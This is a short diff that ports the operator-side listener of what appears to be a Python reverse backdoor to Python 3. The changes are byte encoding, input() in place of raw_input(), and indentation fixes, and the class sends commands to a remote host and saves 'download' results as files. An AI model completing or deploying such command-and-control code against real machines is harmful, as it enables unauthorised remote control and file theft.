@@ -31,10 +31,10 @@ class Listener:
         # convert data as json
         json_data = json.dumps(data)
         # send data as json
-        self.connection.send(json_data)
+        self.connection.send(json_data.encode())
 
     def reliable_receive(self):
-        json_data = ""
+        json_data = b""
         while True:
             try:
                 # receive data as json
@@ -65,7 +65,7 @@ class Listener:
     def run(self):
         while True:
             # ask the user for a command
-            command = raw_input(">> ")
+            command = input(">> ")
             # split the command in a list to have the command and the argument seperated
             command = command.split(" ")
 
@@ -76,10 +76,10 @@ class Listener:
 
                 result = self.execute_remotely(command)
                 if command[0] == "download" and "[-] Error " not in result:
-                   result = self.write_file(command[1], result)
+                    result = self.write_file(command[1], result)
             except Exception:
                 result = "[-] Error during command execution."
-                
+
             # print the result
             print(result)
 
